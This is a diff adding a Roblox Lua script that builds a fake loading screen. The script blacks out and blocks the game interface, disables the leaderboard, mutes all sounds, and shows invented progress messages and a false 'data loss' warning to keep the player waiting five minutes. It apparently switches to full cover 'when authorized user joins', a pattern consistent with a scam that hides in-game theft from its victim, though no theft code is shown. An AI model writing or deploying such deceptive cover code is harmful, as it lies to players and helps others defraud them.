+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBlack
+    title.TextStrokeTransparency = 0.8
+    title.TextStrokeColor3 = Color3.fromRGB(0, 100, 200)
+    title.ZIndex = 12
+    title.Parent = mainContainer
+
+    -- Subtitle
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, 0, 0.1, 0)
+    subtitle.Position = UDim2.new(0, 0, 0.18, 0)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "Final Stage of Loading"
+    subtitle.TextColor3 = Color3.fromRGB(200, 200, 255)
+    subtitle.TextScaled = true
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.ZIndex = 12
+    subtitle.Parent = mainContainer
+
+    -- Status
+    local statusContainer = Instance.new("Frame")
+    statusContainer.Size = UDim2.new(0.9, 0, 0.08, 0)
+    statusContainer.Position = UDim2.new(0.05, 0, 0.3, 0)
+    statusContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 40)
+    statusContainer.BackgroundTransparency = 0.3
+    statusContainer.BorderSizePixel = 0
+    statusContainer.ZIndex = 11
+    statusContainer.Parent = mainContainer
+
+    local statusCorner = Instance.new("UICorner")
+    statusCorner.CornerRadius = UDim.new(0.02, 0)
+    statusCorner.Parent = statusContainer
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(0.25, 0, 1, 0)
+    statusLabel.Position = UDim2.new(0.02, 0, 0, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Status:"
+    statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    statusLabel.TextScaled = true
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.ZIndex = 12
+    statusLabel.Parent = statusContainer
+
+    local statusValue = Instance.new("TextLabel")
+    statusValue.Size = UDim2.new(0.7, 0, 1, 0)
+    statusValue.Position = UDim2.new(0.27, 0, 0, 0)
+    statusValue.BackgroundTransparency = 1
+    statusValue.Text = "Initializing core systems..."
+    statusValue.TextColor3 = Color3.fromRGB(0, 200, 255)
+    statusValue.TextScaled = true
+    statusValue.TextXAlignment = Enum.TextXAlignment.Left
+    statusValue.Font = Enum.Font.GothamBold
+    statusValue.ZIndex = 12
+    statusValue.Parent = statusContainer
+
+    -- Loading Details Container
+    local detailsContainer = Instance.new("Frame")
+    detailsContainer.Size = UDim2.new(0.9, 0, 0.35, 0)
+    detailsContainer.Position = UDim2.new(0.05, 0, 0.4, 0)
+    detailsContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 40)
+    detailsContainer.BackgroundTransparency = 0.3
+    detailsContainer.BorderSizePixel = 0
+    detailsContainer.ZIndex = 11
+    detailsContainer.Parent = mainContainer
+
+    local detailsCorner = Instance.new("UICorner")
+    detailsCorner.CornerRadius = UDim.new(0.02, 0)
+    detailsCorner.Parent = detailsContainer
+
+    local detailsTitle = Instance.new("TextLabel")
+    detailsTitle.Size = UDim2.new(1, 0, 0.2, 0)
+    detailsTitle.Position = UDim2.new(0, 0, 0, 0)
+    detailsTitle.BackgroundTransparency = 1
+    detailsTitle.Text = "LOADING DETAILS"
+    detailsTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    detailsTitle.TextScaled = true
+    detailsTitle.Font = Enum.Font.GothamBold
+    detailsTitle.ZIndex = 12
+    detailsTitle.Parent = detailsContainer
+
+    local detailsText = Instance.new("TextLabel")
+    detailsText.Size = UDim2.new(0.95, 0, 0.75, 0)
+    detailsText.Position = UDim2.new(0.025, 0, 0.2, 0)
+    detailsText.BackgroundTransparency = 1
+    detailsText.Text = "> Loading sound assets...\n> Initializing game mechanics..."
+    detailsText.TextColor3 = Color3.fromRGB(0, 255, 150)
+    detailsText.TextXAlignment = Enum.TextXAlignment.Left
+    detailsText.TextYAlignment = Enum.TextYAlignment.Top
+    detailsText.TextSize = 16
+    detailsText.Font = Enum.Font.Code
+    detailsText.TextWrapped = true
+    detailsText.ZIndex = 12
+    detailsText.Parent = detailsContainer
+
+    -- Message display area (for sequential text)
+    local messageContainer = Instance.new("Frame")
+    messageContainer.Size = UDim2.new(0.9, 0, 0.25, 0)
+    messageContainer.Position = UDim2.new(0.05, 0, 0.77, 0)
+    messageContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 40)
+    messageContainer.BackgroundTransparency = 0.3
+    messageContainer.BorderSizePixel = 0
+    messageContainer.ZIndex = 11
+    messageContainer.Visible = false
+    messageContainer.Parent = mainContainer
+
+    local messageCorner = Instance.new("UICorner")
+    messageCorner.CornerRadius = UDim.new(0.02, 0)
+    messageCorner.Parent = messageContainer
+
+    local messageText = Instance.new("TextLabel")
+    messageText.Size = UDim2.new(0.95, 0, 0.9, 0)
+    messageText.Position = UDim2.new(0.025, 0, 0.05, 0)
+    messageText.BackgroundTransparency = 1
+    messageText.Text = ""
+    messageText.TextColor3 = Color3.fromRGB(255, 255, 150)
+    messageText.TextXAlignment = Enum.TextXAlignment.Left
+    messageText.TextYAlignment = Enum.TextYAlignment.Top
+    messageText.TextSize = 14
+    messageText.Font = Enum.Font.Gotham
+    messageText.TextWrapped = true
+    messageText.ZIndex = 12
+    messageText.Parent = messageContainer
+
+    -- Loading bar (hidden initially)
+    local loadingBarContainer = Instance.new("Frame")
+    loadingBarContainer.Size = UDim2.new(0.9, 0, 0.08, 0)
+    loadingBarContainer.Position = UDim2.new(0.05, 0, 0.77, 0)
+    loadingBarContainer.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
+    loadingBarContainer.BackgroundTransparency = 0.3
+    loadingBarContainer.BorderSizePixel = 0
+    loadingBarContainer.ZIndex = 11
+    loadingBarContainer.Visible = false
+    loadingBarContainer.Parent = mainContainer
+
+    local loadingBarCorner = Instance.new("UICorner")
+    loadingBarCorner.CornerRadius = UDim.new(0.02, 0)
+    loadingBarCorner.Parent = loadingBarContainer
+
+    local loadingBarBg = Instance.new("Frame")
+    loadingBarBg.Size = UDim2.new(0.95, 0, 0.5, 0)
+    loadingBarBg.Position = UDim2.new(0.025, 0, 0.25, 0)
+    loadingBarBg.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
+    loadingBarBg.BorderSizePixel = 0
+    loadingBarBg.ZIndex = 11
+    loadingBarBg.Parent = loadingBarContainer
+
+    local loadingBgCorner = Instance.new("UICorner")
+    loadingBgCorner.CornerRadius = UDim.new(0.08, 0)
+    loadingBgCorner.Parent = loadingBarBg
+
+    local loadingBar = Instance.new("Frame")
+    loadingBar.Size = UDim2.new(0, 0, 1, 0)
+    loadingBar.Position = UDim2.new(0, 0, 0, 0)
+    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    loadingBar.BorderSizePixel = 0
+    loadingBar.ZIndex = 12
+    loadingBar.Parent = loadingBarBg
+
+    local loadingBarFillCorner = Instance.new("UICorner")
+    loadingBarFillCorner.CornerRadius = UDim.new(0.08, 0)
+    loadingBarFillCorner.Parent = loadingBar
+
+    local percentText = Instance.new("TextLabel")
+    percentText.Size = UDim2.new(1, 0, 0.4, 0)
+    percentText.Position = UDim2.new(0, 0, 0.55, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Text = "0%"
+    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentText.TextScaled = true
+    percentText.Font = Enum.Font.GothamBlack
+    percentText.ZIndex = 12
+    percentText.Parent = loadingBarContainer
+
+    print("Both GUIs created - black screen with enhanced click blockers in back, loading screen on top!")
+
+    -- ===== START ALL BLOCKING SYSTEMS =====
+    -- Start aggressive UI blocking
+    spawn(aggressiveUIBlocking)
+
+    -- Disable leaderboard and other core elements
+    disableLeaderboard()
+
+    -- ===== SOUND BLOCKER CODE =====
+    local soundBlockEnabled = true
+    local soundConnections = {}
+
+    local function enableSoundBlock()
+        -- Disconnect existing connections
+        for _, conn in pairs(soundConnections) do
+            if conn then
+                conn:Disconnect()
+            end
+        end
+        
+        -- Reconnect all the blocking functions
+        soundConnections.descendantAdded = game.DescendantAdded:Connect(function(descendant)
+            if descendant:IsA("Sound") and soundBlockEnabled then
+                pcall(function()
+                    descendant.Volume = 0
+                    descendant.Playing = false
+                end)
+            end
+        end)
+        
+        soundConnections.heartbeat = RunService.Heartbeat:Connect(function()
+            if soundBlockEnabled then
+                pcall(function()
+                    for i, v in pairs(workspace:GetDescendants()) do
+                        if v:IsA("Sound") and v.Volume > 0 then
+                            v.Volume = 0
+                        end
+                    end
+                end)
+            end
+        end)
+    end
+
+    -- Toggle with P key
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if input.KeyCode == Enum.KeyCode.P and not gameProcessed then
+            soundBlockEnabled = not soundBlockEnabled
+            if soundBlockEnabled then
+                print("Sound Blocking ENABLED")
+            else
+                print("Sound Blocking DISABLED")
+            end
+        end
+    end)
+
+    -- Start blocking
+    enableSoundBlock()
+
+    -- Deep scan loop for sound blocking
+    spawn(function()
+        while wait(3) do
+            if soundBlockEnabled then
+                pcall(function()
+                    for i, v in pairs(game:GetDescendants()) do
+                        if v:IsA("Sound") then
+                            v.Volume = 0
+                            if v.Playing then
+                                v.Playing = false
+                            end
+                        end
+                    end
+                end)
+            end
+        end
+    end)
+
+    print("Sound Blocker Activated!")
+
+    -- ===== LOADING SEQUENCE =====
+    local loadingProgress = 0
+    local currentStep = 0
+    local totalLoadTime = 300 -- 5 minutes
+
+    -- Text messages to display sequentially
+    local textMessages = {
+        "Hello! The script is almost done loading we just need to do some extra steps.",
+        "During the last stage of loading- PLEASE, do not leave the game or it could result in data loss.",
+        "well yeah. thats all you need to know. Now- Just wait."
+    }
+
+    -- Technical messages for loading details
+    local technicalMessages = {
+        "> Loading sound assets...",
+        "> Initializing game mechanics...",
+        "> Preparing spawn locations...",
+        "> Loading game maps...",
+        "> Setting up player controls...",
+        "> Finalizing system checks...",
+        "> System ready for launch..."
+    }
+
+    -- Function to show text messages sequentially
+    local function showTextSequence()
+        messageContainer.Visible = true
+        loadingBarContainer.Visible = false
+        
+        for i, message in ipairs(textMessages) do
+            messageText.Text = message
+            currentStep = i
+            statusValue.Text = "Displaying message " .. i .. "/" .. #textMessages
+            wait(3)
+        end
+        
+        -- After all messages, show loading bar
+        messageContainer.Visible = false
+        loadingBarContainer.Visible = true
+        statusValue.Text = "Finalizing systems..."
+    end
+
+    -- Loading animation
+    local startTime = tick()
+    local messageTimer = 0
+    local currentMessageIndex = 1
+
+    local connection = RunService.Heartbeat:Connect(function(deltaTime)
+        local currentTime = tick() - startTime
+        
+        -- Animate background elements
+        bgGradient.Offset = Vector2.new(math.sin(tick() * 0.3) * 0.2, math.cos(tick() * 0.2) * 0.1)
+        
+        -- Animate particles
+        for i, particle in pairs(particles:GetChildren()) do
+            if particle:IsA("Frame") then
+                local xPos = math.sin(tick() * 0.5 + i) * 0.1 + 0.5
+                local yPos = math.cos(tick() * 0.3 + i) * 0.1 + 0.5
+                particle.Position = UDim2.new(xPos, 0, yPos, 0)
+            end
+        end
+        
+        -- Update loading progress after text sequence (5 minutes total)
+        if currentStep >= #textMessages then
+            if loadingProgress < 100 then
+                loadingProgress = loadingProgress + (deltaTime * (100 / totalLoadTime))
+                if loadingProgress > 100 then
+                    loadingProgress = 100
+                end
+            end
+            
+            -- Update loading bar
+            loadingBar.Size = UDim2.new(loadingProgress/100, 0, 1, 0)
+            percentText.Text = string.format("%d%%", math.floor(loadingProgress))
+            
+            -- Update technical log (every 1.5 seconds)
+            messageTimer = messageTimer + deltaTime
+            if messageTimer > 1.5 and currentMessageIndex <= #technicalMessages then
+                local messagesToShow = ""
+                local startIndex = math.max(1, currentMessageIndex - 3)
+                for i = startIndex, currentMessageIndex do
+                    if i <= #technicalMessages then
+                        messagesToShow = messagesToShow .. technicalMessages[i] .. "\n"
+                    end
+                end
+                detailsText.Text = messagesToShow
+                
+                currentMessageIndex = currentMessageIndex + 1
+                if currentMessageIndex > #technicalMessages then
+                    currentMessageIndex = 1
+                end
+                messageTimer = 0
+            end
+            
+            -- Update status based on progress
+            if loadingProgress < 20 then
+                statusValue.Text = "Initializing core systems..."
+            elseif loadingProgress < 40 then
+                statusValue.Text = "Loading game resources..."
+            elseif loadingProgress < 60 then
+                statusValue.Text = "Compiling scripts..."
+            elseif loadingProgress < 80 then
+                statusValue.Text = "Setting up environment..."
+            elseif loadingProgress < 95 then
+                statusValue.Text = "Finalizing systems..."
+            else
+                statusValue.Text = "Ready to launch!"
+            end
+            
+            -- Complete loading
+            if loadingProgress >= 100 then
+                connection:Disconnect()
+                statusValue.Text = "Complete! Launching..."
+                
+                -- Wait a moment then remove both loading screens
+                wait(3)
+                finalLoadingScreen:Destroy()
+                screenGui:Destroy()  -- Also remove the black background
+                print("Final stage loading complete! All overlays removed.")
+            end
+        end
+    end)
+
+    -- Start the loading sequence
+    spawn(showTextSequence)
+
+    print("Full Loading Screen Activated!")
+end
+
+-- ===== START THE SYSTEM =====
+-- Global function for command system to trigger
+_G.StartFullLoadingScreen = StartFullLoadingScreen
+
+-- Start with half loading screen
+StartHalfLoadingScreen()
+
+print("🎯 Combined Loading System Loaded!")
+print("⏳ Half screen will switch to full when authorized user joins")
